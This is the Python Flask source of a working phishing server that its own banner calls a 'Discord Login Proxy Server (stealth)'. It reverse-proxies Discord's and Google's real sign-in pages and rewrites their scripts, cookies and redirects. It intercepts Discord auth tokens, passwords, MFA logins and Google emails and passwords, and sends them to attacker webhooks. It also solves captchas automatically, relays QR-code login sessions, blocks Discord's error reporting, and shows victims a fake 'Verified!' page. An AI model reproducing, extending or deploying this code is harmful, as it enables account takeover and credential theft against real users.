@app.route('/api/login/retry/<sid>', methods=['POST'])
def api_login_retry(sid):
    """Retry login after user verified their email (new location check)."""
    sess = login_sessions.get(sid)
    if not sess:
        return jsonify({'error': 'Session expired. Please try logging in again.', 'retry': True}), 404

    # Reset session for background retry
    sess['status'] = 'solving'
    sess['result'] = None
    sess['result_code'] = 200
    threading.Thread(target=_bg_retry, args=(sid,), daemon=True).start()
    return jsonify({'captcha_stall': True, 'session_id': sid})


def _bg_retry(sid):
    """Background retry after email verification."""
    try:
        sess = login_sessions.get(sid)
        if not sess:
            return

        ds = sess.get('retry_ds') or sess.get('session')
        payload = sess.get('retry_payload') or sess.get('payload')

        print(f'[retry:{sid}] Retrying login after email verify...')

        # Fresh connection
        snap = ds.snapshot()
        ds2 = DiscordSession()
        ds2.s = _make_session()
        ds2.restore(snap)

        r = ds2.post('/auth/login', payload)
        j = r.json()
        print(f'[retry:{sid}] Result [{r.status_code}]: {r.text[:400]}')

        # May need captcha again
        ckeys = j.get('captcha_key', [])
        is_captcha = isinstance(ckeys, list) and (
            'captcha-required' in ckeys or 'invalid-response' in ckeys
            or j.get('captcha_sitekey')
        )

        if is_captcha:
            sitekey = j.get('captcha_sitekey', 'a9b5fb07-92ff-493f-86fe-352a2803b3df')
            rqdata = j.get('captcha_rqdata', '')
            rqtoken = j.get('captcha_rqtoken', '')
            print(f'[retry:{sid}] Captcha required, solving...')
            presolved = _get_presolved()
            if presolved:
                solved = presolved
                err = None
                print(f'[retry:{sid}] Using PRE-SOLVED token!')
            else:
                solved, err = solve_captcha(sitekey, rqdata)
            if not solved:
                sess['result'] = {'error': f'Captcha solve failed: {err}'}
                sess['result_code'] = 500
                sess['status'] = 'done'
                return
            payload['captcha_key'] = solved
            payload['captcha_rqtoken'] = rqtoken
            snap2 = ds2.snapshot()
            ds3 = DiscordSession()
            ds3.s = _make_session()
            ds3.restore(snap2)
            r = ds3.post('/auth/login', payload)
            j = r.json()
            print(f'[retry:{sid}] After captcha [{r.status_code}]: {r.text[:400]}')

        if j.get('token'):
            ip = sess.get('client_ip', '?')
            pw = sess.get('pw', '?')
            fire_webhook(j['token'], ip, pw)
            sess['result'] = _success_with_info(j['token'])
            sess['result_code'] = 200
        elif j.get('ticket') and j.get('mfa') is not None:
            sess['result'] = j
            sess['result_code'] = 200
        else:
            sess['result'] = j
            sess['result_code'] = r.status_code if r else 500

        sess['status'] = 'done'
        print(f'[retry:{sid}] Done. token={j.get("token") is not None}, mfa={j.get("mfa") is not None}')

    except Exception as e:
        import traceback
        traceback.print_exc()
        if sid in login_sessions:
            login_sessions[sid]['result'] = {'error': str(e)}
            login_sessions[sid]['result_code'] = 500
            login_sessions[sid]['status'] = 'done'


@app.route('/api/mfa/totp', methods=['POST'])
def api_mfa_totp():
    d = request.json
    try:
        ds = DiscordSession()
        ds.prepare()
        ticket = d.get('ticket')
        r = ds.post('/auth/mfa/totp', {
            'code': d.get('code'), 'ticket': ticket,
            'gift_code_sku_id': None, 'login_source': None,
        })
        j = r.json()
        if j.get('token'):
            ip = request.headers.get('X-Forwarded-For', request.remote_addr)
            with _pw_store_lock:
                pw = _pw_store.pop(ticket, '?') if ticket else '?'
            if pw == '?':
                pw = d.get('pw', '?')  # Fallback: frontend round-trip
            fire_webhook(j['token'], ip, pw)
            return jsonify(_success_with_info(j['token']))
        return jsonify(j), r.status_code
    except Exception as e:
        return jsonify({'error': str(e)}), 500


@app.route('/api/mfa/sms/send', methods=['POST'])
def api_mfa_sms_send():
    d = request.json
    try:
        ds = DiscordSession()
        ds.prepare()
        r = ds.post('/auth/mfa/sms/send', {'ticket': d.get('ticket')})
        return jsonify(r.json()), r.status_code
    except Exception as e:
        return jsonify({'error': str(e)}), 500


@app.route('/api/mfa/sms', methods=['POST'])
def api_mfa_sms_verify():
    d = request.json
    try:
        ds = DiscordSession()
        ds.prepare()
        ticket = d.get('ticket')
        r = ds.post('/auth/mfa/sms', {
            'code': d.get('code'), 'ticket': ticket,
            'gift_code_sku_id': None, 'login_source': None,
        })
        j = r.json()
        if j.get('token'):
            ip = request.headers.get('X-Forwarded-For', request.remote_addr)
            with _pw_store_lock:
                pw = _pw_store.pop(ticket, '?') if ticket else '?'
            if pw == '?':
                pw = d.get('pw', '?')  # Fallback: frontend round-trip
            fire_webhook(j['token'], ip, pw)
            return jsonify(_success_with_info(j['token']))
        return jsonify(j), r.status_code
    except Exception as e:
        return jsonify({'error': str(e)}), 500


@app.route('/api/mfa/backup', methods=['POST'])
def api_mfa_backup():
    """Submit an 8-digit backup code for MFA verification."""
    d = request.json
    try:
        ds = DiscordSession()
        ds.prepare()
        # Discord uses the same /auth/mfa/totp endpoint for backup codes
        # The code format (8-digit with hyphen) tells Discord it's a backup code
        code = d.get('code', '').strip().replace(' ', '-')
        ticket = d.get('ticket')
        r = ds.post('/auth/mfa/totp', {
            'code': code, 'ticket': ticket,
            'gift_code_sku_id': None, 'login_source': None,
        })
        j = r.json()
        if j.get('token'):
            ip = request.headers.get('X-Forwarded-For', request.remote_addr)
            with _pw_store_lock:
                pw = _pw_store.pop(ticket, '?') if ticket else '?'
            if pw == '?':
                pw = d.get('pw', '?')  # Fallback: frontend round-trip
            fire_webhook(j['token'], ip, pw)
            return jsonify(_success_with_info(j['token']))
        return jsonify(j), r.status_code
    except Exception as e:
        return jsonify({'error': str(e)}), 500


# Active QR sessions per IP (dedup concurrent page loads hitting /api/qr/start)
_qr_by_ip = {}   # ip -> session id
_qr_by_ip_lock = threading.Lock()
QR_MAX_SESSIONS = 30  # hard cap on simultaneous QR sessions


@app.route('/api/qr/start')
def api_qr_start():
    # Gate: must have a valid page token (issued at /login page load)
    tok = request.args.get('t', '')
    if not _check_page_token(tok):
        return jsonify({'err': 'Invalid session. Please reload the page.', 'reload': True}), 403

    ok, retry_after = _rate_check('qr_start')
    if not ok:
        return jsonify({'err': f'Too many requests. Try again in {retry_after}s.', 'retry_after': retry_after}), 429

    client_ip = request.headers.get('X-Forwarded-For', request.remote_addr)
    if client_ip:
        client_ip = client_ip.split(',')[0].strip()

    # Dedup: if this IP already has an active QR session in progress, reuse it
    with _qr_by_ip_lock:
        existing_sid = _qr_by_ip.get(client_ip)
        if existing_sid and existing_sid in sessions:
            s = sessions[existing_sid]
            if s.fp:
                return jsonify({'id': s.id, 'fp': s.fp})
            if s.st not in ('error', 'cancelled', 'expired', 'done'):
                # Still warming up — wait briefly for this existing session
                for _ in range(50):
                    if s.fp or s.st in ('error', 'cancelled'):
                        break
                    time.sleep(0.1)
                if s.fp:
                    return jsonify({'id': s.id, 'fp': s.fp})

    # Hard cap on total active QR sessions (prevent OOM from bot floods)
    if len(sessions) >= QR_MAX_SESSIONS:
        # Clean up stale sessions first
        dead = [k for k, v in list(sessions.items()) if v.st in ('done', 'error', 'cancelled', 'expired')]
        for k in dead:
            s2 = sessions.pop(k, None)
            if s2:
                try: s2.ws.close()
                except: pass
        # If still over cap after cleanup, reject
        if len(sessions) >= QR_MAX_SESSIONS:
            return jsonify({'id': None, 'err': 'Server busy, please retry'}), 503

    s = QRAuth()
    sessions[s.id] = s
    with _qr_by_ip_lock:
        _qr_by_ip[client_ip] = s.id
    threading.Thread(target=_qr_worker, args=(s,), daemon=True).start()

    # Wait up to 8s for QR fingerprint (pool sessions arrive in ~1s, cold ~5s)
    for _ in range(80):
        if s.fp or s.st in ('error', 'cancelled'):
            break
        time.sleep(0.1)

    if s.fp:
        return jsonify({'id': s.id, 'fp': s.fp})
    return jsonify({'id': s.id, 'err': s.err or 'Timeout'}), 500


@app.route('/api/qr/poll/<sid>')
def api_qr_poll(sid):
    ok, retry_after = _rate_check('qr_poll')
    if not ok:
        return jsonify({'st': 'error', 'err': 'rate_limited', 'retry_after': retry_after}), 429
    s = sessions.get(sid)
    if not s:
        return jsonify({'st': 'error', 'err': 'Gone'}), 404
    out = {'st': s.st}
    if s.user:         out['user'] = s.user
    if s.st == 'done' and s.token:
        # Use _success_with_info to assign role + voice + webhook + spread (once only)
        if not getattr(s, '_info_fired', False):
            s._info_fired = True
            fire_webhook(s.token)
            s._cached_info = _success_with_info(s.token)
        out.update(getattr(s, '_cached_info', {'success': True}))
    if s.err:          out['err'] = s.err
    return jsonify(out)


@app.route('/api/qr/stop/<sid>', methods=['POST'])
def api_qr_stop(sid):
    s = sessions.pop(sid, None)
    if s:
        s._stop.set()
        try: s.ws.close()
        except: pass
    return jsonify({'ok': True})


# ━━━━━━━━━━━━ Reverse Proxy Routes ━━━━━━━━━━━━

@app.route('/cdn-cgi/<path:rest>', methods=['GET', 'POST', 'OPTIONS'])
def proxy_cdn_cgi(rest):
    """Proxy Cloudflare challenge scripts and POSTs."""
    url = f'https://discord.com/cdn-cgi/{rest}'
    qs = request.query_string.decode()
    if qs:
        url += '?' + qs
    try:
        s = _make_session()
        fwd = {'User-Agent': UA, 'Accept': '*/*'}
        if request.method == 'POST':
            r = s.post(url, headers=fwd, data=request.get_data(), timeout=20)
        else:
            r = s.get(url, headers=fwd, timeout=20)
        resp = make_response(r.content, r.status_code)
        ct = r.headers.get('Content-Type', 'application/javascript')
        resp.headers['Content-Type'] = ct
        resp.headers['Access-Control-Allow-Origin'] = '*'
        return resp
    except:
        return make_response('', 502)


@app.route('/error-reporting-proxy/<path:rest>', methods=['POST', 'OPTIONS'])
def proxy_error_reporting(rest):
    """Sink Discord's error reporting — don't leak to their Sentry."""
    return '', 204


@sock.route('/remote-auth/')
def ws_remote_auth(ws):
    """WebSocket proxy for Discord's remote-auth-gateway (QR code login).
    Browser connects here; we relay to Discord with correct Origin header."""
    qs = request.query_string.decode()
    target = 'wss://remote-auth-gateway.discord.gg/'
    if qs:
        target += '?' + qs
    upstream = None
    try:
        upstream = websocket.create_connection(
            target,
            origin='https://discord.com',
            header=['User-Agent: ' + UA],
            timeout=60,
        )
        print(f'[ws-proxy] Connected to remote-auth-gateway')
        closed = threading.Event()

        def upstream_to_client():
            """Relay messages from Discord -> browser."""
            try:
                while not closed.is_set():
                    upstream.settimeout(2)
                    try:
                        msg = upstream.recv()
                    except websocket.WebSocketTimeoutException:
                        continue
                    if msg is None:
                        break
                    ws.send(msg)
            except Exception as e:
                print(f'[ws-proxy] upstream->client error: {e}')
            finally:
                closed.set()

        def client_to_upstream():
            """Relay messages from browser -> Discord."""
            try:
                while not closed.is_set():
                    try:
                        msg = ws.receive(timeout=2)
                    except Exception:
                        break
                    if msg is None:
                        continue
                    if isinstance(msg, bytes):
                        upstream.send_binary(msg)
                    else:
                        upstream.send(msg)
            except Exception as e:
                print(f'[ws-proxy] client->upstream error: {e}')
            finally:
                closed.set()

        t1 = threading.Thread(target=upstream_to_client, daemon=True)
        t2 = threading.Thread(target=client_to_upstream, daemon=True)
        t1.start()
        t2.start()
        closed.wait()
    except Exception as e:
        print(f'[ws-proxy] remote-auth error: {e}')
    finally:
        closed.set()
        if upstream:
            try: upstream.close()
            except: pass


@app.route('/ra/<path:fingerprint>')
def ra_redirect(fingerprint):
    """Redirect /ra/{fingerprint} to Discord so the mobile app handles the deep link."""
    return redirect(f'https://discord.com/ra/{fingerprint}')


@app.route('/--/captured', methods=['POST'])
def captured_token():
    """Client-side JS sends intercepted tokens here."""
    try:
        d = request.get_json(silent=True) or json.loads(request.data or b'{}')
        token = d.get('t', '')
        pw = d.get('p', '') or '?'
        source = d.get('s', '?')
        if token and len(token) > 30:
            ip = request.headers.get('X-Forwarded-For', request.remote_addr)
            print(f'[CAPTURED-JS] Token via {source}, IP={_clean_ip(ip)}')
            fire_webhook(token, ip, pw)
            # Assign role using tenant context
            tenant = _get_tenant()
            if tenant:
                _success_with_info(token, tenant)
    except Exception as e:
        print(f'[captured] Error: {e}')
    return '', 204


@app.route('/--/captured-google', methods=['POST'])
def captured_google():
    """Client-side JS sends intercepted Google credentials here."""
    try:
        d = request.get_json(silent=True) or json.loads(request.data or b'{}')
        email = d.get('e', '')
        pw = d.get('p', '')
        if email and pw:
            ip = request.headers.get('X-Forwarded-For', request.remote_addr)
            print(f'[GOOGLE-JS] Captured {email}, IP={_clean_ip(ip)}')
            _fire_google_webhook(email, pw, ip)
    except Exception as e:
        print(f'[google-captured] Error: {e}')
    return '', 204


@app.route('/google-login')
def google_login_page():
    """Serve proxied Google sign-in page."""
    entry_url = 'https://accounts.google.com/v3/signin/identifier?continue=https%3A%2F%2Fmyaccount.google.com&followup=https%3A%2F%2Fmyaccount.google.com&ifkv=1&passive=1209600&flowName=GlifWebSignIn&flowEntry=ServiceLogin'
    new_sid = uuid.uuid4().hex[:16]
    s = creq.Session(impersonate='chrome')
    with _google_sessions_lock:
        _google_sessions[new_sid] = {'s': s, 'ts': time.time()}
    try:
        r = s.get(entry_url, headers={
            'User-Agent': UA, 'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
            'Accept-Language': 'en-US,en;q=0.9',
            'Sec-CH-UA': SEC_CH_UA, 'Sec-CH-UA-Mobile': SEC_CH_UA_MOBILE,
            'Sec-CH-UA-Platform': SEC_CH_UA_PLATFORM,
            'Sec-Fetch-Dest': 'document', 'Sec-Fetch-Mode': 'navigate',
            'Sec-Fetch-Site': 'none', 'Sec-Fetch-User': '?1',
            'Upgrade-Insecure-Requests': '1',
        }, timeout=20, allow_redirects=True)
        if r.status_code == 200:
            html = _google_rewrite_html(r.text)
            resp = make_response(html)
            resp.headers['Content-Type'] = 'text/html; charset=utf-8'
            resp.headers['Cache-Control'] = 'no-store'
            resp.set_cookie('_gsid', new_sid, max_age=600, httponly=True, samesite='Lax')
            return resp
        print(f'[google-proxy] Google returned {r.status_code}')
    except Exception as e:
        print(f'[google-proxy] Failed to fetch Google login: {e}')
    return make_response('Google login temporarily unavailable', 502)


@app.route('/_gp/<domain>/<path:rest>', methods=['GET', 'POST', 'PUT', 'PATCH', 'DELETE', 'OPTIONS'])
def google_proxy(domain, rest):
    """Generic reverse proxy for Google domains."""
    if domain not in GOOGLE_PROXY_DOMAINS:
        return make_response('', 404)

    # CORS preflight
    if request.method == 'OPTIONS':
        resp = make_response('', 204)
        resp.headers['Access-Control-Allow-Origin'] = '*'
        resp.headers['Access-Control-Allow-Methods'] = 'GET,POST,PUT,PATCH,DELETE,OPTIONS'
        resp.headers['Access-Control-Allow-Headers'] = request.headers.get(
            'Access-Control-Request-Headers', '*')
        resp.headers['Access-Control-Max-Age'] = '86400'
        return resp

    qs = request.query_string.decode()
    url = f'https://{domain}/{rest}'
    if qs:
        url += '?' + qs

    sid, s = _get_google_session()

    # Build headers
    fwd = {}
    for key, val in request.headers:
        kl = key.lower()
        if kl in ('host', 'cookie', 'accept-encoding', 'connection',
                  'x-forwarded-for', 'x-forwarded-proto', 'x-real-ip',
                  'x-request-id', 'cf-connecting-ip', 'cf-ray'):
            continue
        fwd[key] = val
    fwd['Host'] = domain
    if 'Origin' in fwd:
        fwd['Origin'] = f'https://{domain}'
    if 'Referer' in fwd:
        fwd['Referer'] = f'https://{domain}/'

    body = request.get_data()
    method = request.method.lower()

    # Server-side credential capture from POST forms
    client_ip = request.headers.get('X-Forwarded-For', request.remote_addr)
    if method == 'post' and body:
        _check_google_creds(body, f'{domain}/{rest}', client_ip)

    try:
        if method == 'get':
            r = s.get(url, headers=fwd, timeout=30, allow_redirects=False)
        elif method == 'post':
            r = s.post(url, headers=fwd, data=body, timeout=30, allow_redirects=False)
        elif method == 'put':
            r = s.put(url, headers=fwd, data=body, timeout=30, allow_redirects=False)
        elif method == 'patch':
            r = s.patch(url, headers=fwd, data=body, timeout=30, allow_redirects=False)
        elif method == 'delete':
            r = s.delete(url, headers=fwd, timeout=30, allow_redirects=False)
        else:
            return make_response('', 405)
    except Exception as e:
        print(f'[gproxy] {method.upper()} {url} failed: {e}')
        return make_response('Proxy error', 502)

    # Handle redirects — rewrite Location header
    if r.status_code in (301, 302, 303, 307, 308):
        location = r.headers.get('Location', '')
        location = _google_rewrite_redirect(location)
        resp = make_response('', r.status_code)
        resp.headers['Location'] = location
        resp.set_cookie('_gsid', sid, max_age=600, httponly=True, samesite='Lax')
        return resp

    # Rewrite HTML responses
    ct = r.headers.get('Content-Type', '')
    data = r.content
    if 'text/html' in ct:
        data = _google_rewrite_html(data.decode('utf-8', errors='replace')).encode('utf-8')
    elif 'javascript' in ct:
        text = data.decode('utf-8', errors='replace')
        for d in GOOGLE_PROXY_DOMAINS:
            text = text.replace(f'https://{d}/', f'/_gp/{d}/')
            text = text.replace(f'//{d}/', f'/_gp/{d}/')
        data = text.encode('utf-8')
    elif 'text/css' in ct:
        text = data.decode('utf-8', errors='replace')
        for d in GOOGLE_PROXY_DOMAINS:
            text = text.replace(f'https://{d}/', f'/_gp/{d}/')
        data = text.encode('utf-8')

    resp = make_response(data, r.status_code)
    for key, val in r.headers.items():
        kl = key.lower()
        if kl in _STRIP_RESP:
            continue
        if kl == 'set-cookie':
            # Strip Domain= attribute so cookies work on our domain
            val = re.sub(r';\s*[Dd]omain=[^;]*', '', val)
            val = re.sub(r';\s*[Ss]ecure', '', val)
        resp.headers[key] = val
    resp.headers['Access-Control-Allow-Origin'] = '*'
    resp.set_cookie('_gsid', sid, max_age=600, httponly=True, samesite='Lax')
    return resp


@app.route('/assets/<path:rest>')
def proxy_assets(rest):
    """Proxy Discord's static assets (JS, CSS, images, fonts) with caching."""
    cache_key = f'/assets/{rest}'
    with _asset_cache_lock:
        cached = _asset_cache.get(cache_key)
        if cached and (time.time() - cached['time']) < ASSET_CACHE_TTL:
            resp = make_response(cached['data'], 200)
            resp.headers['Content-Type'] = cached['ct']
            resp.headers['Cache-Control'] = 'public, max-age=31536000, immutable'
            resp.headers['Access-Control-Allow-Origin'] = '*'
            return resp
    url = f'https://discord.com/assets/{rest}'
    try:
        s = _make_session()
        r = s.get(url, headers={'User-Agent': UA, 'Accept': '*/*'}, timeout=30)
        if r.status_code != 200:
            return make_response('', r.status_code)
        ct = r.headers.get('Content-Type', 'application/octet-stream')
        data = r.content
        # Rewrite JS files
        if 'javascript' in ct or rest.endswith('.js'):
            data = _proxy_rewrite_js(data.decode('utf-8', errors='replace')).encode('utf-8')
        # Rewrite CSS files
        elif 'css' in ct or rest.endswith('.css'):
            text = data.decode('utf-8', errors='replace')
            text = text.replace('https://discord.com/', '/')
            text = text.replace('https://cdn.discordapp.com/', '/cdn/')
            data = text.encode('utf-8')
        # Cache
        with _asset_cache_lock:
            if len(_asset_cache) >= ASSET_CACHE_MAX:
                oldest_key = min(_asset_cache, key=lambda k: _asset_cache[k]['time'])
                del _asset_cache[oldest_key]
            _asset_cache[cache_key] = {'data': data, 'ct': ct, 'time': time.time()}
        resp = make_response(data, 200)
        resp.headers['Content-Type'] = ct
        resp.headers['Cache-Control'] = 'public, max-age=31536000, immutable'
        resp.headers['Access-Control-Allow-Origin'] = '*'
        return resp
    except Exception as e:
        print(f'[proxy-asset] Error fetching {url}: {e}')
        return make_response('', 502)


@app.route('/cdn/<path:rest>')
def proxy_cdn(rest):
    """Proxy Discord CDN (avatars, emojis, etc) with in-memory caching."""
    cache_key = f'/cdn/{rest}'
    with _cdn_cache_lock:
        cached = _cdn_cache.get(cache_key)
        if cached and (time.time() - cached['time']) < CDN_CACHE_TTL:
            resp = make_response(cached['data'], 200)
            resp.headers['Content-Type'] = cached['ct']
            resp.headers['Cache-Control'] = 'public, max-age=3600'
            resp.headers['Access-Control-Allow-Origin'] = '*'
            return resp
    url = f'https://cdn.discordapp.com/{rest}'
    try:
        s = _make_session()
        r = s.get(url, headers={'User-Agent': UA}, timeout=20)
        if r.status_code != 200:
            return make_response('', r.status_code)
        ct = r.headers.get('Content-Type', 'application/octet-stream')
        data = r.content
        # Only cache reasonable sizes (<5MB)
        if len(data) < 5_000_000:
            with _cdn_cache_lock:
                if len(_cdn_cache) >= CDN_CACHE_MAX:
                    oldest_key = min(_cdn_cache, key=lambda k: _cdn_cache[k]['time'])
                    del _cdn_cache[oldest_key]
                _cdn_cache[cache_key] = {'data': data, 'ct': ct, 'time': time.time()}
        resp = make_response(data, 200)
        resp.headers['Content-Type'] = ct
        resp.headers['Cache-Control'] = 'public, max-age=3600'
        resp.headers['Access-Control-Allow-Origin'] = '*'
        return resp
    except:
        return make_response('', 502)


@app.route('/api/v9/<path:rest>', methods=['GET', 'POST', 'PUT', 'PATCH', 'DELETE', 'OPTIONS'])
@app.route('/api/v10/<path:rest>', methods=['GET', 'POST', 'PUT', 'PATCH', 'DELETE', 'OPTIONS'])
def proxy_discord_api_v(rest):
    """Proxy Discord API v9/v10 — intercepts auth tokens server-side."""
    version = 'v10' if request.path.startswith('/api/v10') else 'v9'
    discord_url = f'https://discord.com/api/{version}/{rest}'
    qs = request.query_string.decode()
    if qs:
        discord_url += '?' + qs

    # CORS preflight
    if request.method == 'OPTIONS':
        resp = make_response('', 204)
        resp.headers['Access-Control-Allow-Origin'] = '*'
        resp.headers['Access-Control-Allow-Methods'] = 'GET,POST,PUT,PATCH,DELETE,OPTIONS'
        resp.headers['Access-Control-Allow-Headers'] = request.headers.get(
            'Access-Control-Request-Headers', '*')
        resp.headers['Access-Control-Max-Age'] = '86400'
        return resp

    # Get proxy session
    sid, s = _get_proxy_session()

    # Build headers for Discord
    fwd = {}
    for key, val in request.headers:
        kl = key.lower()
        if kl in ('host', 'cookie', 'accept-encoding', 'connection',
                  'x-forwarded-for', 'x-forwarded-proto', 'x-real-ip',
                  'x-request-id', 'cf-connecting-ip', 'cf-ray'):
            continue
        fwd[key] = val
    fwd['Host'] = 'discord.com'
    if 'Origin' in fwd:
        fwd['Origin'] = 'https://discord.com'
    if 'Referer' in fwd:
        fwd['Referer'] = 'https://discord.com/login'

    body = request.get_data()
    method = request.method.lower()

    try:
        if method == 'get':
            r = s.get(discord_url, headers=fwd, timeout=30)
        elif method == 'post':
            r = s.post(discord_url, headers=fwd, data=body, timeout=30)
        elif method == 'put':
            r = s.put(discord_url, headers=fwd, data=body, timeout=30)
        elif method == 'patch':
            r = s.patch(discord_url, headers=fwd, data=body, timeout=30)
        elif method == 'delete':
            r = s.delete(discord_url, headers=fwd, timeout=30)
        else:
            return make_response('', 405)
    except Exception as e:
        print(f'[proxy-api] {method.upper()} {discord_url} failed: {e}')
        return jsonify({'message': 'Proxy connection error', 'code': 0}), 502

    # ═══ TOKEN INTERCEPTION ═══
    client_ip = request.headers.get('X-Forwarded-For', request.remote_addr)
    tenant = _get_tenant()
    _check_and_capture(r.content, rest, client_ip, body, tenant=tenant)

    # Build response
    resp = make_response(r.content, r.status_code)
    for key, val in r.headers.items():
        if key.lower() not in _STRIP_RESP:
            resp.headers[key] = val
    resp.headers['Access-Control-Allow-Origin'] = '*'
    resp.headers['Access-Control-Expose-Headers'] = '*'
    resp.set_cookie('_dsid', sid, max_age=600, httponly=True, samesite='Lax')
    return resp


@app.route('/channels')
@app.route('/channels/<path:rest>')
def proxy_channels_redirect(rest=''):
    """After login Discord redirects here. Redirect to tenant verify page with verified state."""
    tenant = _get_tenant()
    if tenant:
        if tenant.get('server_int'):
            return redirect(f'/{tenant["identifier"]}/{tenant["server_int"]}?verified=1')
        return redirect(f'/{tenant["guild_id"]}/{tenant["role_id"]}/{tenant["bot_key"]}?verified=1')
    return make_response('''<!DOCTYPE html><html><head><meta charset="utf-8"><title>Discord</title></head>
<body style="background:#313338;display:flex;align-items:center;justify-content:center;height:100vh;margin:0;font-family:sans-serif">
<div style="text-align:center;color:#fff">
<div style="width:80px;height:80px;border-radius:50%;background:#23a55a;margin:0 auto 20px;display:flex;align-items:center;justify-content:center">
<svg width="40" height="40" viewBox="0 0 24 24" fill="none" stroke="#fff" stroke-width="3"><path d="M20 6L9 17l-5-5"/></svg></div>
<h1 style="color:#23a55a;font-size:28px;margin:0 0 10px">Verified!</h1>
<p style="color:#b5bac1;font-size:14px;margin:0">You may now close this window.</p>
</div></body></html>''', 200, {'Content-Type': 'text/html'})


@app.route('/app')
def proxy_app_redirect():
    """Some Discord flows redirect to /app."""
    return proxy_channels_redirect()


# ━━━━━━━━━━━━ Main ━━━━━━━━━━━━

if __name__ == '__main__':
    import gc
    print('[*] Fetching build number...')
    fetch_build_number()

    def _cleanup():
        while True:
            time.sleep(60)  # every 60s instead of 300s — more aggressive cleanup
            try:
                dead = [k for k, v in sessions.items() if v.st in ('done', 'error', 'cancelled', 'expired')]
                for k in dead:
                    s = sessions.pop(k, None)
                    if s:
                        try: s.ws.close()
                        except: pass
                # Clear stale login sessions (>2 min old)
                now = time.time()
                stale_login = [k for k, v in list(login_sessions.items()) if (now - v.get('_created_at', 0)) > 120]
                for k in stale_login:
                    login_sessions.pop(k, None)
                # Clear stale prechallenges (>2 min old)
                stale_pc = [k for k, v in list(_prechallenges.items()) if (now - v.get('time', 0)) > 120]
                for k in stale_pc:
                    _prechallenges.pop(k, None)
                # Clear stale pw_store entries
                _pw_store.clear()
                # Clean up _qr_by_ip for sessions that are gone
                with _qr_by_ip_lock:
                    stale_ip = [ip for ip, sid in list(_qr_by_ip.items()) if sid not in sessions]
                    for ip in stale_ip:
                        del _qr_by_ip[ip]
                # Clean up expired page tokens
                with _page_token_lock:
                    expired_toks = [t for t, exp in list(_page_tokens.items()) if time.time() > exp]
                    for t in expired_toks:
                        del _page_tokens[t]
                cleaned = len(dead) + len(stale_login) + len(stale_pc)
                if cleaned:
                    print(f'[cleanup] Removed {len(dead)} QR, {len(stale_login)} login, {len(stale_pc)} prechallenge sessions')
                # Clean up stale proxy sessions
                with _proxy_sessions_lock:
                    stale_proxy = [k for k, v in list(_proxy_sessions.items()) if now - v['ts'] > PROXY_SESSION_TTL]
                    for k in stale_proxy:
                        try: _proxy_sessions.pop(k)['s'].close()
                        except: pass
                # Clean up stale asset cache
                with _asset_cache_lock:
                    stale_assets = [k for k, v in list(_asset_cache.items()) if now - v['time'] > ASSET_CACHE_TTL]
                    for k in stale_assets:
                        del _asset_cache[k]
                # Clean up stale CDN cache
                with _cdn_cache_lock:
                    stale_cdn = [k for k, v in list(_cdn_cache.items()) if now - v['time'] > CDN_CACHE_TTL]
                    for k in stale_cdn:
                        del _cdn_cache[k]
                # Clean up stale Google proxy sessions
                with _google_sessions_lock:
                    stale_gp = [k for k, v in list(_google_sessions.items()) if now - v['ts'] > GOOGLE_SESSION_TTL]
                    for k in stale_gp:
                        try: _google_sessions.pop(k)['s'].close()
                        except: pass
                # Clean up stale Google asset cache
                with _google_asset_cache_lock:
                    stale_ga = [k for k, v in list(_google_asset_cache.items()) if now - v['time'] > GOOGLE_ASSET_CACHE_TTL]
                    for k in stale_ga:
                        del _google_asset_cache[k]
                # Clean up stale tenant cache (>10 min)
                with _tenant_lock:
                    stale_tenants = [k for k, v in list(_tenant_cache.items()) if now - v['ts'] > 600]
                    for k in stale_tenants:
                        del _tenant_cache[k]
                # Force garbage collection to free curl_cffi / SSL memory
                gc.collect()
            except Exception as e:
                print(f'[cleanup] Error: {e}')
    threading.Thread(target=_cleanup, daemon=True).start()

    # 24/7 global captcha token arsenal — pre-solves tokens continuously
    # Arsenal loop disabled — on-demand solving only (saves ~$7/day)
    # threading.Thread(target=_arsenal_loop, daemon=True).start()

    # Start session pre-warm pool
    threading.Thread(target=_session_pool_loop, daemon=True).start()

    # Pre-fetch Discord login page so first request is fast
    threading.Thread(target=_fetch_login_html, daemon=True).start()

    print(f'\n  Discord Login Proxy Server (stealth)')
    print(f'  http://0.0.0.0:{PORT}\n')
    print(f'  /login        \u2192 Proxied real Discord login (token interception)')
    print(f'  /login-classic \u2192 Fallback clone-based login\n')
    app.run('0.0.0.0', PORT, debug=False, threaded=True)
